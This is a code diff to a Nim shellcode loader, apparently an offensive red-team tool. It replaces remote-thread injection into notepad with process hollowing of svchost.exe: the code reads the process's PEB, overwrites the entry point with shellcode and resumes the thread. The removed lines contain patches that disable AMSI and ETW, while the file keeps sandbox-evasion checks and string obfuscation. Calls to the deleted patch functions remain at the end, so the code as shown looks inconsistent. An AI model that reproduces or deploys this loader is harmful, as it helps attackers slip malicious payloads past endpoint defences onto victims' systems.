@@ -1,19 +1,16 @@
 #[
-    Author: Marcello Salvati, Twitter: @byt3bl33d3r
-    License: BSD 3-Clause
-    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim
+    Credits https://github.com/snovvcrash/NimHollow
 ]#
 
-# CreateRemoteThread in Notepad using easy to use high level APIs
-
-
-import winim/lean
-import osproc
-import dynlib
-import strenc # add a bit more of obfuscation for embedded strings
-import random
-import times
 import os
+import times
+import dynlib
+import endians
+import strformat
+import winim
+import nimcrypto
+import random
+import strenc # add a bit more of obfuscation for embedded strings
 import strformat
 
 proc WeirdApi(): bool =
@@ -49,129 +46,138 @@ proc MetaSandbox(): bool =
     else:
         return true
 
-proc Patchntdll(): bool =
-    when defined amd64:
-        echo "[*] Running in x64 process"
-        const patch: array[1, byte] = [byte 0xc3]
-    elif defined i386:
-        echo "[*] Running in x86 process"
-        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
+proc hollowShellcode[byte](shellcode: openArray[byte]): void =
+    let
+        processImage: string = r"C:\Windows\System32\svchost.exe"
     var
-        ntdll: LibHandle
-        cs: pointer
-        op: DWORD
-        t: DWORD
-        disabled: bool = false
+        nBytes: SIZE_T
+        tmp: ULONG
+        res: WINBOOL
+        baseAddressBytes: array[0..sizeof(PVOID), byte]
+        data: array[0..0x200, byte]
 
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    ntdll = loadLib("ntdll")
-    if isNil(ntdll):
-        echo "[X] Failed to load ntdll.dll"
-        return disabled
+    var ps: SECURITY_ATTRIBUTES
+    var ts: SECURITY_ATTRIBUTES
+    var si: STARTUPINFOEX
+    var pi: PROCESS_INFORMATION
 
-    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
-    if isNil(cs):
-        echo "[X] Failed to get the address of 'EtwEventWrite'"
-        return disabled
-
-    if VirtualProtect(cs, patch.len, 0x40, addr op):
-        echo "[*] Applying patch"
-        copyMem(cs, unsafeAddr patch, patch.len)
-        VirtualProtect(cs, patch.len, op, addr t)
-        disabled = true
-
-    return disabled
-
-
-proc PatchAmsi(): bool =
-    when defined amd64:
-        echo "[*] Running in x64 process"
-        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
-    elif defined i386:
-        echo "[*] Running in x86 process"
-        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
-    var
-        amsi: LibHandle
-        cs: pointer
-        op: DWORD
-        t: DWORD
-        disabled: bool = false
-
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    amsi = loadLib("amsi")
-    if isNil(amsi):
-        echo "[X] Failed to load amsi.dll"
-        return disabled
-
-    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
-    if isNil(cs):
-        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
-        return disabled
-
-    if VirtualProtect(cs, patch.len, 0x40, addr op):
-        echo "[*] Applying patch"
-        copyMem(cs, unsafeAddr patch, patch.len)
-        VirtualProtect(cs, patch.len, op, addr t)
-        disabled = true
-
-    return disabled
-
-
-proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
-
-
-    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-    let tProcess = startProcess("notepad.exe")
-    tProcess.suspend() # That's handy!
-    defer: tProcess.close()
-
-    echo "[*] Target Process: ", tProcess.processID
-
-    let pHandle = OpenProcess(
-        PROCESS_ALL_ACCESS, 
-        false, 
-        cast[DWORD](tProcess.processID)
-    )
-    defer: CloseHandle(pHandle)
-
-    echo "[*] pHandle: ", pHandle
-
-    let rPtr = VirtualAllocEx(
-        pHandle,
+    res = CreateProcess(
         NULL,
-        cast[SIZE_T](shellcode.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
+        newWideCString(processImage),
+        ps,
+        ts, 
+        FALSE,
+        0x4, # CREATE_SUSPENDED
+        NULL,
+        NULL,
+        addr si.StartupInfo,
+        addr pi)
 
-    var bytesWritten: SIZE_T
-    let wSuccess = WriteProcessMemory(
-        pHandle, 
-        rPtr,
+    if res == 0:
+        echo fmt"[DEBUG] (CreateProcess) : Failed to start process from image {processImage}, exiting"
+        return
+
+    var hProcess = pi.hProcess
+    var bi: PROCESS_BASIC_INFORMATION
+
+    res = NtQueryInformationProcess(
+        hProcess,
+        0, # ProcessBasicInformation
+        addr bi,
+        cast[ULONG](sizeof(bi)),
+        addr tmp)
+
+    if res != 0:
+        echo "[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting"
+        return
+
+    var ptrImageBaseAddress = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)
+
+    res = NtReadVirtualMemory(
+        hProcess,
+        ptrImageBaseAddress,
+        addr baseAddressBytes,
+        sizeof(PVOID),
+        addr nBytes)
+
+    if res != 0:
+        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read image base address, exiting"
+        return
+
+    var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
+
+    res = NtReadVirtualMemory(
+        hProcess,
+        imageBaseAddress,
+        addr data,
+        len(data),
+        addr nBytes)
+
+    if res != 0:
+        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read first 0x200 bytes of the PE structure, exiting"
+        return
+
+    var e_lfanew: uint
+    littleEndian32(addr e_lfanew, addr data[0x3c])
+    echo "[DEBUG] e_lfanew = ", e_lfanew
+
+    var entrypointRvaOffset = e_lfanew + 0x28
+    echo "[DEBUG] entrypointRvaOffset = ", entrypointRvaOffset
+
+    var entrypointRva: uint
+    littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
+    echo "[DEBUG] entrypointRva = ", entrypointRva
+
+    var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
+    echo "[DEBUG] entrypointAddress = ", cast[uint64](entrypointAddress)
+
+    var protectAddress = entrypointAddress
+    var shellcodeLength = cast[SIZE_T](len(shellcode))
+    var oldProtect: ULONG
+
+    res = NtProtectVirtualMemory(
+        hProcess,
+        addr protectAddress,
+        addr shellcodeLength,
+        0x40, # PAGE_EXECUTE_READWRITE
+        addr oldProtect)
+
+    if res != 0:
+        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting"
+        return
+
+    res = NtWriteVirtualMemory(
+        hProcess,
+        entrypointAddress,
         unsafeAddr shellcode,
-        cast[SIZE_T](shellcode.len),
-        addr bytesWritten
-    )
+        len(shellcode),
+        addr nBytes)
 
-    echo "[*] WriteProcessMemory: ", bool(wSuccess)
-    echo "    \\-- bytes written: ", bytesWritten
-    echo ""
+    if res != 0:
+        echo "[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting"
+        return
 
-    let tHandle = CreateRemoteThread(
-        pHandle, 
-        NULL,
-        0,
-        cast[LPTHREAD_START_ROUTINE](rPtr),
-        NULL, 
-        0, 
-        NULL
-    )
-    defer: CloseHandle(tHandle)
+    res = NtProtectVirtualMemory(
+        hProcess,
+        addr protectAddress,
+        addr shellcodeLength,
+        oldProtect,
+        addr tmp)
 
-    echo "[*] tHandle: ", tHandle
-    echo "[+] Injected"
+    if res != 0:
+        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to revert memory permissions at the EntryPoint, exiting"
+        return
+
+    res = NtResumeThread(
+        pi.hThread,
+        addr tmp)
+
+    if res != 0:
+        echo "[DEBUG] (NtResumeThread) : Failed to resume thread, exiting"
+        return
+
+    res = NtClose(
+        hProcess)
 
 
 when defined(windows):
@@ -236,4 +242,4 @@ when defined(windows):
         echo fmt"[*] AMSI disabled: {bool(amsi_success)}"
         var etw_success = Patchntdll()
         echo fmt"[*] ETW blocked by patch: {bool(etw_success)}"
-        injectCreateRemoteThread(shellcode)
+        hollowShellcode(shellcode)
